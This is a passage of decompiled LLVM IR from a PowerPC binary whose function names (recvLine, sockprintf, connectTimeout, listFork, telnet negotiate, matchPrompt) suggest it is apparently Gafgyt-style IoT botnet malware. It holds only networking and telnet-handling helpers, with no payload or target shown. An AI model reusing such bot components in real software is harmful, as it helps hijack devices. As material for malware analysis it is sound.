  uselistorder label %dec_label_pc_10002448, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_100024c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_100025404 = icmp sgt i32 %arg2, 0
  br i1 %v2_100025404, label %dec_label_pc_100024dc, label %dec_label_pc_10002548

dec_label_pc_100024dc:                            ; preds = %entry, %dec_label_pc_100024dc
  %storemerge37 = phi i32 [ %v1_10002530, %dec_label_pc_100024dc ], [ 0, %entry ]
  %v2_100024e8 = add i32 %storemerge37, %v0_100024c0
  %v0_100024ec = call i32 @rand_cmwc()
  store i32 %v0_100024ec, i32* %r3.global-to-local, align 4
  %v1_10002500 = urem i32 %v0_100024ec, 26
  %fold = add nuw nsw i32 %v1_10002500, 65
  %v1_10002528 = trunc i32 %fold to i8
  %v3_10002528 = inttoptr i32 %v2_100024e8 to i8*
  store i8 %v1_10002528, i8* %v3_10002528, align 1
  %v1_10002530 = add nuw nsw i32 %storemerge37, 1
  %v2_10002540 = icmp slt i32 %v1_10002530, %arg2
  br i1 %v2_10002540, label %dec_label_pc_100024dc, label %dec_label_pc_10002538.dec_label_pc_10002548_crit_edge

dec_label_pc_10002538.dec_label_pc_10002548_crit_edge: ; preds = %dec_label_pc_100024dc
  %v0_10002560.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10002548

dec_label_pc_10002548:                            ; preds = %dec_label_pc_10002538.dec_label_pc_10002548_crit_edge, %entry
  %v0_10002560 = phi i32 [ %v0_10002560.pre, %dec_label_pc_10002538.dec_label_pc_10002548_crit_edge ], [ %v0_100024c0, %entry ]
  ret i32 %v0_10002560

; uselistorder directives
  uselistorder i32 %v1_10002530, { 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i32 %v0_100024c0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_100024dc, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i8, align 1
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1000259c.43 to i32), i32* @lr, align 4
  %v4_10002598 = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg3)
  store i32 30, i32* %stack_var_-40, align 4
  %v2_100025ac = ptrtoint i32* %stack_var_-168 to i32
  br label %dec_label_pc_100025c0

dec_label_pc_100025c0:                            ; preds = %entry, %dec_label_pc_100025c0
  %storemerge719 = phi i32 [ 0, %entry ], [ %v1_100025dc, %dec_label_pc_100025c0 ]
  %v1_100025c8 = mul nuw nsw i32 %storemerge719, 4
  %v2_100025cc = add i32 %v1_100025c8, %v2_100025ac
  %v2_100025d4 = inttoptr i32 %v2_100025cc to i32*
  store i32 0, i32* %v2_100025d4, align 4
  %v1_100025dc = add nuw nsw i32 %storemerge719, 1
  %tmp43 = icmp ult i32 %v1_100025dc, 32
  br i1 %tmp43, label %dec_label_pc_100025c0, label %dec_label_pc_100025f0

dec_label_pc_100025f0:                            ; preds = %dec_label_pc_100025c0
  %v1_100025f4 = udiv i32 %arg1, 32
  %v1_100025fc = mul nuw nsw i32 %v1_100025f4, 4
  %v2_10002600 = ptrtoint i32* %stack_var_-200 to i32
  %v2_10002604 = add nuw nsw i32 %v1_100025fc, 32
  %v1_10002608 = add i32 %v2_10002604, %v2_10002600
  %v1_1000260c = inttoptr i32 %v1_10002608 to i32*
  %v2_1000260c = load i32, i32* %v1_1000260c, align 4
  %v1_10002614 = urem i32 %arg1, 32
  %v3_1000261c = shl i32 1, %v1_10002614
  %v2_10002620 = or i32 %v2_1000260c, %v3_1000261c
  store i32 %v2_10002620, i32* %v1_1000260c, align 4
  %v1_1000263c = add i32 %arg1, 1
  %v2_10002648 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268445284, i32* @lr, align 4
  %v5_10002660 = call i32 @__libc_select(i32 %v1_1000263c, i32 %v2_100025ac, i32 0, i32 %v2_100025ac, i32 %v2_10002648)
  %v2_10002670 = icmp sgt i32 %v5_10002660, 0
  br i1 %v2_10002670, label %dec_label_pc_1000281c.preheader, label %dec_label_pc_10002780.preheader

dec_label_pc_10002780.preheader:                  ; preds = %dec_label_pc_100025f0
  %tmp44 = icmp slt i32 %tmp26, 10
  br i1 %tmp44, label %dec_label_pc_1000267c, label %dec_label_pc_1000281c.preheader

dec_label_pc_1000267c:                            ; preds = %dec_label_pc_10002780.preheader, %dec_label_pc_10002774
  %stack_var_-176.018 = phi i32 [ %v1_10002778, %dec_label_pc_10002774 ], [ %tmp26, %dec_label_pc_10002780.preheader ]
  %v3_10002680 = load i32, i32* @global_var_1002b8f8.44, align 4
  store i32 ptrtoint (i32* @global_var_10002698.46 to i32), i32* @lr, align 4
  %v4_10002694 = call i32 @sockprintf(i32 %v3_10002680, i32 ptrtoint ([5 x i8]* @global_var_10017b30.45 to i32), i32 268500992)
  store i32 30, i32* %stack_var_-40, align 4
  store i32 %v2_100025ac, i32* %stack_var_-200, align 4
  store i32 0, i32* %stack_var_-168, align 4
  br label %dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge

dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge: ; preds = %dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge.dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge_crit_edge, %dec_label_pc_1000267c
  %v3_100026c0.pre = phi i32 [ %v2_100025ac, %dec_label_pc_1000267c ], [ %v3_100026c0.pre.pre, %dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge.dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge_crit_edge ]
  %v1_100026d850 = phi i32 [ 1, %dec_label_pc_1000267c ], [ %v1_100026d8, %dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge.dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge_crit_edge ]
  %v1_100026c4 = mul nuw nsw i32 %v1_100026d850, 4
  %v2_100026c8 = add i32 %v1_100026c4, %v3_100026c0.pre
  %v2_100026d0 = inttoptr i32 %v2_100026c8 to i32*
  store i32 0, i32* %v2_100026d0, align 4
  %v1_100026d8 = add nuw nsw i32 %v1_100026d850, 1
  %tmp45 = icmp ult i32 %v1_100026d8, 32
  br i1 %tmp45, label %dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge.dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge_crit_edge, label %dec_label_pc_100026ec

dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge.dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge_crit_edge: ; preds = %dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge
  %v3_100026c0.pre.pre = load i32, i32* %stack_var_-200, align 4
  br label %dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge

dec_label_pc_100026ec:                            ; preds = %dec_label_pc_100026bc.dec_label_pc_100026bc_crit_edge
  %v2_10002708 = load i32, i32* %v1_1000260c, align 4
  %v2_1000271c = or i32 %v2_10002708, %v3_1000261c
  store i32 %v2_1000271c, i32* %v1_1000260c, align 4
  store i32 268445536, i32* @lr, align 4
  %v5_1000275c = call i32 @__libc_select(i32 %v1_1000263c, i32 %v2_100025ac, i32 0, i32 %v2_100025ac, i32 %v2_10002648)
  %v2_1000276c = icmp sgt i32 %v5_1000275c, 0
  br i1 %v2_1000276c, label %dec_label_pc_1000281c.preheader, label %dec_label_pc_10002774

dec_label_pc_10002774:                            ; preds = %dec_label_pc_100026ec
  %v1_10002778 = add nsw i32 %stack_var_-176.018, 1
  %tmp46 = icmp slt i32 %v1_10002778, 10
  br i1 %tmp46, label %dec_label_pc_1000267c, label %dec_label_pc_1000281c.preheader

dec_label_pc_1000281c.preheader:                  ; preds = %dec_label_pc_10002774, %dec_label_pc_100026ec, %dec_label_pc_10002780.preheader, %dec_label_pc_100025f0
  %v2_100027a8 = ptrtoint i8* %stack_var_-32 to i32
  br label %dec_label_pc_1000281c

dec_label_pc_100027a0:                            ; preds = %dec_label_pc_1000281c
  %v3_100027a4 = load i32, i32* @global_var_1002b8f8.44, align 4
  store i32 268445632, i32* @lr, align 4
  %v4_100027bc = call i32 @__libc_recv(i32 %v3_100027a4, i32 %v2_100027a8, i32 1, i32 0)
  %v3_100027c4 = icmp eq i32 %v4_100027bc, 1
  br i1 %v3_100027c4, label %dec_label_pc_100027e4, label %dec_label_pc_100027cc

dec_label_pc_100027cc:                            ; preds = %dec_label_pc_100027a0
  store i8 0, i8* %stack_var_-180.0, align 1
  br label %dec_label_pc_10002858

dec_label_pc_100027e4:                            ; preds = %dec_label_pc_100027a0
  %v3_100027e4 = load i8, i8* %stack_var_-32, align 1
  %v4_100027ec = ptrtoint i8* %stack_var_-180.0 to i32
  store i8 %v3_100027e4, i8* %stack_var_-180.0, align 1
  %v1_100027f8 = add i32 %v4_100027ec, 1
  %v5_100027fc = inttoptr i32 %v1_100027f8 to i8*
  %v3_10002800 = load i8, i8* %stack_var_-32, align 1
  %v3_10002808 = icmp eq i8 %v3_10002800, 10
  br i1 %v3_10002808, label %dec_label_pc_10002844, label %dec_label_pc_10002810

dec_label_pc_10002810:                            ; preds = %dec_label_pc_100027e4
  %v1_10002814 = add i32 %stack_var_-184.0, 1
  br label %dec_label_pc_1000281c

dec_label_pc_1000281c:                            ; preds = %dec_label_pc_1000281c.preheader, %dec_label_pc_10002810
  %stack_var_-180.0 = phi i8* [ %v5_100027fc, %dec_label_pc_10002810 ], [ %arg2, %dec_label_pc_1000281c.preheader ]
  %stack_var_-184.0 = phi i32 [ %v1_10002814, %dec_label_pc_10002810 ], [ 0, %dec_label_pc_1000281c.preheader ]
  %v0_10002824 = call i32 @__asm_mfcr()
  %v1_10002828 = call i32 @__asm_rlwinm(i32 %v0_10002824, i32 30, i32 31, i32 31)
  %v1_1000282c = urem i32 %v1_10002828, 256
  %v3_1000283c = icmp eq i32 %v1_1000282c, 0
  br i1 %v3_1000283c, label %dec_label_pc_10002844, label %dec_label_pc_100027a0

dec_label_pc_10002844:                            ; preds = %dec_label_pc_1000281c, %dec_label_pc_100027e4
  %stack_var_-180.1 = phi i8* [ %stack_var_-180.0, %dec_label_pc_1000281c ], [ %v5_100027fc, %dec_label_pc_100027e4 ]
  store i8 0, i8* %stack_var_-180.1, align 1
  br label %dec_label_pc_10002858

dec_label_pc_10002858:                            ; preds = %dec_label_pc_100027cc, %dec_label_pc_10002844
  %storemerge = phi i32 [ -1, %dec_label_pc_100027cc ], [ %stack_var_-184.0, %dec_label_pc_10002844 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-180.0, { 3, 0, 1, 2 }
  uselistorder i8* %v5_100027fc, { 1, 0 }
  uselistorder i32 %v1_10002778, { 1, 0 }
  uselistorder i32 %v1_100026d8, { 1, 0 }
  uselistorder i32 %v2_10002648, { 1, 0 }
  uselistorder i32* %v1_1000260c, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge719, { 1, 0 }
  uselistorder i32 %v2_100025ac, { 5, 4, 0, 6, 3, 2, 1 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i8* %stack_var_-32, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002858, { 1, 0 }
  uselistorder label %dec_label_pc_1000281c, { 1, 0 }
  uselistorder label %dec_label_pc_1000267c, { 1, 0 }
  uselistorder label %dec_label_pc_100025c0, { 1, 0 }
}

define i32 @hostname_to_ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 268445852, i32* @lr, align 4
  %v1_10002898 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v3_100028a8 = icmp eq i32 %v1_10002898, 0
  br i1 %v3_100028a8, label %dec_label_pc_100028b0, label %dec_label_pc_100028c8

dec_label_pc_100028b0:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_100028bc.48 to i32), i32* @lr, align 4
  %v4_100028b8 = call i32 @__GI_herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10017b38.47, i32 0, i32 0), i32 268500992)
  br label %dec_label_pc_1000294c

dec_label_pc_100028c8:                            ; preds = %entry
  %v1_100028cc = add i32 %v1_10002898, 16
  %v2_100028cc = inttoptr i32 %v1_100028cc to i32*
  %v3_100028cc = load i32, i32* %v2_100028cc, align 4
  %v1_100028f0 = inttoptr i32 %v3_100028cc to i32*
  %v2_100028f0 = load i32, i32* %v1_100028f0, align 4
  %v3_100028f4 = icmp eq i32 %v2_100028f0, 0
  br i1 %v3_100028f4, label %dec_label_pc_10002944, label %dec_label_pc_100028fc

dec_label_pc_100028fc:                            ; preds = %dec_label_pc_100028c8
  %v2_10002910 = load i32, i32* %v1_100028f0, align 4
  %v1_10002914 = inttoptr i32 %v2_10002910 to i32*
  %v2_10002914 = load i32, i32* %v1_10002914, align 4
  store i32 %v2_10002914, i32* %stack_var_-16, align 4
  store i32 268445992, i32* @lr, align 4
  %v3_10002924 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-16, i32 %v2_10002910)
  %v2_10002934 = inttoptr i32 %v3_10002924 to i8*
  %v3_10002934 = call i32 @strcpy(i32 %arg2, i8* %v2_10002934)
  br label %dec_label_pc_1000294c

dec_label_pc_10002944:                            ; preds = %dec_label_pc_100028c8
  br label %dec_label_pc_1000294c

dec_label_pc_1000294c:                            ; preds = %dec_label_pc_100028fc, %dec_label_pc_100028b0, %dec_label_pc_10002944
  %stack_var_-12.0 = phi i32 [ 1, %dec_label_pc_100028b0 ], [ 1, %dec_label_pc_10002944 ], [ 0, %dec_label_pc_100028fc ]
  ret i32 %stack_var_-12.0

; uselistorder directives
  uselistorder label %dec_label_pc_1000294c, { 2, 0, 1 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  store i32 268446116, i32* @lr, align 4
  %v2_100029a0 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  store i32 ptrtoint (i32* @global_var_100029cc.50 to i32), i32* @lr, align 4
  %v2_100029c8 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-200, align 4
  %v1_100029d8 = urem i32 %arg3, 65536
  store i32 %v1_100029d8, i32* @r3, align 4
  %v1_100029e0 = call i32 @htons(i32 %v1_100029d8)
  %v2_100029f0 = ptrtoint i32* %stack_var_-200 to i32
  %v4_10002a00 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-196, i32 %v2_100029f0)
  %v3_10002a08 = icmp eq i32 %v4_10002a00, 0
  br i1 %v3_10002a08, label %dec_label_pc_10002a1c, label %dec_label_pc_10002a10

dec_label_pc_10002a10:                            ; preds = %entry
  br label %dec_label_pc_10002bdc

dec_label_pc_10002a1c:                            ; preds = %entry
  store i32 268446280, i32* @lr, align 4
  %v3_10002a44 = call i32 @__libc_connect(i32 %arg1, i32 %v2_100029f0, i32 16)
  %tmp26 = icmp sgt i32 %v3_10002a44, -1
  br i1 %tmp26, label %dec_label_pc_10002b98, label %dec_label_pc_10002a5c

dec_label_pc_10002a5c:                            ; preds = %dec_label_pc_10002a1c
  %v0_10002a5c = call i32 @__errno_location()
  %v1_10002a64 = inttoptr i32 %v0_10002a5c to i32*
  %v2_10002a64 = load i32, i32* %v1_10002a64, align 4
  %v3_10002a68 = icmp eq i32 %v2_10002a64, 115
  br i1 %v3_10002a68, label %dec_label_pc_10002a70, label %dec_label_pc_10002b8c

dec_label_pc_10002a70:                            ; preds = %dec_label_pc_10002a5c
  store i32 %arg4, i32* %stack_var_-56, align 4
  %v2_10002a80 = ptrtoint i32* %stack_var_-184 to i32
  store i32 %v2_10002a80, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-184, align 4
  br label %dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge

dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge: ; preds = %dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge.dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge_crit_edge, %dec_label_pc_10002a70
  %v3_10002a98.pre = phi i32 [ %v2_10002a80, %dec_label_pc_10002a70 ], [ %v3_10002a98.pre.pre, %dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge.dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge_crit_edge ]
  %v1_10002ab030 = phi i32 [ 1, %dec_label_pc_10002a70 ], [ %v1_10002ab0, %dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge.dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge_crit_edge ]
  %v1_10002a9c = mul nuw nsw i32 %v1_10002ab030, 4
  %v2_10002aa0 = add i32 %v1_10002a9c, %v3_10002a98.pre
  %v2_10002aa8 = inttoptr i32 %v2_10002aa0 to i32*
  store i32 0, i32* %v2_10002aa8, align 4
  %v1_10002ab0 = add nuw nsw i32 %v1_10002ab030, 1
  %tmp27 = icmp ult i32 %v1_10002ab0, 32
  br i1 %tmp27, label %dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge.dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge_crit_edge, label %dec_label_pc_10002ac4

dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge.dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge_crit_edge: ; preds = %dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge
  %v3_10002a98.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge

dec_label_pc_10002ac4:                            ; preds = %dec_label_pc_10002a94.dec_label_pc_10002a94_crit_edge
  %v1_10002ac8 = udiv i32 %arg1, 32
  %v1_10002ad0 = mul nuw nsw i32 %v1_10002ac8, 4
  %v2_10002ad4 = ptrtoint i32* %stack_var_-216 to i32
  %v2_10002ad8 = add nuw nsw i32 %v1_10002ad0, 32
  %v1_10002adc = add i32 %v2_10002ad8, %v2_10002ad4
  %v1_10002ae0 = inttoptr i32 %v1_10002adc to i32*
  %v2_10002ae0 = load i32, i32* %v1_10002ae0, align 4
  %v1_10002ae8 = urem i32 %arg1, 32
  %v3_10002af0 = shl i32 1, %v1_10002ae8
  %v2_10002af4 = or i32 %v2_10002ae0, %v3_10002af0
  store i32 %v2_10002af4, i32* %v1_10002ae0, align 4
  %v1_10002b10 = add i32 %arg1, 1
  %v2_10002b18 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268446516, i32* @lr, align 4
  %v5_10002b30 = call i32 @__libc_select(i32 %v1_10002b10, i32 0, i32 %v2_10002a80, i32 0, i32 %v2_10002b18)
  %tmp28 = icmp slt i32 %v5_10002b30, 1
  br i1 %tmp28, label %dec_label_pc_10002b80, label %dec_label_pc_10002b40

dec_label_pc_10002b40:                            ; preds = %dec_label_pc_10002ac4
  store i32 4, i32* %stack_var_-48, align 4
  %v2_10002b48 = ptrtoint i32* %stack_var_-44 to i32
  %v2_10002b4c = ptrtoint i32* %stack_var_-48 to i32
  store i32 268446568, i32* @lr, align 4
  %v5_10002b64 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_10002b48, i32 %v2_10002b4c)
  %v3_10002b68 = load i32, i32* %stack_var_-44, align 4
  %v3_10002b6c = icmp eq i32 %v3_10002b68, 0
  br i1 %v3_10002b6c, label %dec_label_pc_10002b98, label %dec_label_pc_10002b74

dec_label_pc_10002b74:                            ; preds = %dec_label_pc_10002b40
  br label %dec_label_pc_10002bdc

dec_label_pc_10002b80:                            ; preds = %dec_label_pc_10002ac4
  br label %dec_label_pc_10002bdc

dec_label_pc_10002b8c:                            ; preds = %dec_label_pc_10002a5c
  br label %dec_label_pc_10002bdc

dec_label_pc_10002b98:                            ; preds = %dec_label_pc_10002b40, %dec_label_pc_10002a1c
  store i32 268446636, i32* @lr, align 4
  %v2_10002ba8 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_10002bb8 = call i32 @__asm_rlwinm(i32 %v2_10002ba8, i32 0, i32 21, i32 19)
  store i32 ptrtoint (i32* @global_var_10002bd4.51 to i32), i32* @lr, align 4
  %v2_10002bd0 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_10002bdc

dec_label_pc_10002bdc:                            ; preds = %dec_label_pc_10002b8c, %dec_label_pc_10002b80, %dec_label_pc_10002b74, %dec_label_pc_10002a10, %dec_label_pc_10002b98
  %stack_var_-24.0 = phi i32 [ 1, %dec_label_pc_10002b98 ], [ 0, %dec_label_pc_10002b80 ], [ 0, %dec_label_pc_10002b74 ], [ 0, %dec_label_pc_10002b8c ], [ 0, %dec_label_pc_10002a10 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v1_10002ab0, { 1, 0 }
  uselistorder i32 %v2_10002a80, { 1, 0, 2 }
  uselistorder i32 %v2_100029f0, { 1, 0 }
  uselistorder i32 %v1_100029d8, { 1, 0 }
  uselistorder i32* %stack_var_-200, { 1, 0 }
  uselistorder i32* %stack_var_-216, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 2, 3, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_10002bdc, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  store i32 268446740, i32* @lr, align 4
  %v0_10002c10 = call i32 @__libc_fork()
  %v3_10002c20 = icmp eq i32 %v0_10002c10, 0
  br i1 %v3_10002c20, label %dec_label_pc_10002da4, label %dec_label_pc_10002c34

dec_label_pc_10002c34:                            ; preds = %entry
  %v3_10002c3c = load i32, i32* @global_var_1002b904.53, align 4
  %v2_10002c40 = load i32, i32* @global_var_1002b900.52, align 4
  %v1_10002c44 = add i32 %v3_10002c3c, 1
  %v2_10002c44 = icmp eq i32 %v3_10002c3c, -1
  %v2_10002c48 = zext i1 %v2_10002c44 to i32
  %v3_10002c48 = add i32 %v2_10002c48, %v2_10002c40
  store i32 %v3_10002c48, i32* @global_var_1002b900.52, align 4
  store i32 %v1_10002c44, i32* @global_var_1002b904.53, align 4
  %v1_10002c78 = mul i32 %v1_10002c44, 4
  %v1_10002c80 = add i32 %v1_10002c78, 4
  store i32 268446860, i32* @lr, align 4
  %v1_10002c88 = call i32 @malloc(i32 %v1_10002c80)
  br label %dec_label_pc_10002ce0

dec_label_pc_10002ca0:                            ; preds = %dec_label_pc_10002ce0, %dec_label_pc_10002d30
  %v1_10002ca4 = mul i32 %storemerge2, 4
  %v2_10002cb0 = add i32 %v1_10002ca4, %v1_10002c88
  %v3_10002cc4 = load i32, i32* @global_var_1002b92c.54, align 4
  %v2_10002cc8 = add i32 %v3_10002cc4, %v1_10002ca4
  %v1_10002ccc = inttoptr i32 %v2_10002cc8 to i32*
  %v2_10002ccc = load i32, i32* %v1_10002ccc, align 4
  %v2_10002cd0 = inttoptr i32 %v2_10002cb0 to i32*
  store i32 %v2_10002ccc, i32* %v2_10002cd0, align 4
  %v1_10002cd8 = add i32 %storemerge2, 1
  br label %dec_label_pc_10002ce0

dec_label_pc_10002ce0:                            ; preds = %dec_label_pc_10002c34, %dec_label_pc_10002ca0
  %storemerge2 = phi i32 [ 0, %dec_label_pc_10002c34 ], [ %v1_10002cd8, %dec_label_pc_10002ca0 ]
  %v3_10002d08 = load i32, i32* @global_var_1002b904.53, align 4
  %v2_10002d0c = load i32, i32* @global_var_1002b900.52, align 4
  %v2_10002d10 = icmp ne i32 %v3_10002d08, 0
  %v3_10002d14 = add i32 %v2_10002d0c, -1
  %v4_10002d14 = sext i1 %v2_10002d10 to i32
  %v3_10002d28 = icmp eq i32 %v3_10002d14, %v4_10002d14
  br i1 %v3_10002d28, label %dec_label_pc_10002d30, label %dec_label_pc_10002ca0

dec_label_pc_10002d30:                            ; preds = %dec_label_pc_10002ce0
  %v1_10002d10 = add i32 %v3_10002d08, -1
  %v3_10002d48 = icmp ugt i32 %v1_10002d10, %storemerge2
  br i1 %v3_10002d48, label %dec_label_pc_10002ca0, label %dec_label_pc_10002d50

dec_label_pc_10002d50:                            ; preds = %dec_label_pc_10002d30
  %v1_10002d64 = mul i32 %v3_10002d08, 4
  %v2_10002d70 = add i32 %v1_10002c88, -4
  %v1_10002d74 = add i32 %v2_10002d70, %v1_10002d64
  %v2_10002d7c = inttoptr i32 %v1_10002d74 to i32*
  store i32 %v0_10002c10, i32* %v2_10002d7c, align 4
  %v3_10002d84 = load i32, i32* @global_var_1002b92c.54, align 4
  store i32 268447120, i32* @lr, align 4
  %v1_10002d8c = call i32 @free(i32 %v3_10002d84)
  store i32 %v1_10002c88, i32* @global_var_1002b92c.54, align 4
  br label %dec_label_pc_10002da4

dec_label_pc_10002da4:                            ; preds = %entry, %dec_label_pc_10002d50
  ret i32 %v0_10002c10

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_10002ca4, { 1, 0 }
  uselistorder i32 %v1_10002c88, { 1, 2, 0 }
  uselistorder i32 %v3_10002c3c, { 1, 0 }
  uselistorder label %dec_label_pc_10002da4, { 1, 0 }
  uselistorder label %dec_label_pc_10002ce0, { 1, 0 }
  uselistorder label %dec_label_pc_10002ca0, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i8, align 1
  %v1_10002de8 = add i32 %arg2, 1
  %v1_10002dec = inttoptr i32 %v1_10002de8 to i8*
  %v2_10002dec = load i8, i8* %v1_10002dec, align 1
  %v1_10002dfc = icmp ult i8 %v2_10002dec, -5
  br i1 %v1_10002dfc, label %dec_label_pc_10002f54, label %dec_label_pc_10002e04

dec_label_pc_10002e04:                            ; preds = %entry
  %v2_10002e08 = icmp eq i8 %v2_10002dec, -1
  br i1 %v2_10002e08, label %dec_label_pc_10002e10, label %dec_label_pc_10002e2c

dec_label_pc_10002e10:                            ; preds = %dec_label_pc_10002e04
  br label %dec_label_pc_10002f54

dec_label_pc_10002e2c:                            ; preds = %dec_label_pc_10002e04
  store i8 -1, i8* %stack_var_-56, align 1
  %v2_10002e38 = ptrtoint i8* %stack_var_-56 to i32
  store i32 268447308, i32* @lr, align 4
  %v4_10002e48 = call i32 @__libc_send(i32 %arg1, i32 %v2_10002e38, i32 1, i32 16384)
  %v2_10002e54 = load i8, i8* %v1_10002dec, align 1
  %v3_10002e5c = icmp eq i8 %v2_10002e54, -4
  br i1 %v3_10002e5c, label %dec_label_pc_10002e64, label %dec_label_pc_10002e70

dec_label_pc_10002e64:                            ; preds = %dec_label_pc_10002e2c
  store i8 -2, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002f18

dec_label_pc_10002e70:                            ; preds = %dec_label_pc_10002e2c
  %v2_10002e78 = load i8, i8* %v1_10002dec, align 1
  %v3_10002e80 = icmp eq i8 %v2_10002e78, -2
  br i1 %v3_10002e80, label %dec_label_pc_10002e88, label %dec_label_pc_10002e94

dec_label_pc_10002e88:                            ; preds = %dec_label_pc_10002e70
  store i8 -4, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002f18

dec_label_pc_10002e94:                            ; preds = %dec_label_pc_10002e70
  %v2_10002e9c = load i8, i8* %v1_10002dec, align 1
  %v3_10002ea4 = icmp eq i8 %v2_10002e9c, 3
  br i1 %v3_10002ea4, label %dec_label_pc_10002eac, label %dec_label_pc_10002ee4

dec_label_pc_10002eac:                            ; preds = %dec_label_pc_10002e94
  store i8 -3, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002f18

dec_label_pc_10002ee4:                            ; preds = %dec_label_pc_10002e94
  %v3_10002ebc = icmp eq i8 %v2_10002e9c, -3
  %.7 = select i1 %v3_10002ebc, i8 -4, i8 -2
  store i8 %.7, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002f18

dec_label_pc_10002f18:                            ; preds = %dec_label_pc_10002eac, %dec_label_pc_10002e88, %dec_label_pc_10002e64, %dec_label_pc_10002ee4
  store i32 268447536, i32* @lr, align 4
  %v4_10002f2c = call i32 @__libc_send(i32 %arg1, i32 %v2_10002e38, i32 1, i32 16384)
  %v1_10002f34 = add i32 %arg2, 2
  store i32 ptrtoint (i32* @global_var_10002f4c.55 to i32), i32* @lr, align 4
  %v4_10002f48 = call i32 @__libc_send(i32 %arg1, i32 %v1_10002f34, i32 1, i32 16384)
  br label %dec_label_pc_10002f54

dec_label_pc_10002f54:                            ; preds = %dec_label_pc_10002e10, %dec_label_pc_10002f18, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-56, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder label %dec_label_pc_10002f54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10002f18, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i32 %arg1) local_unnamed_addr {
entry:
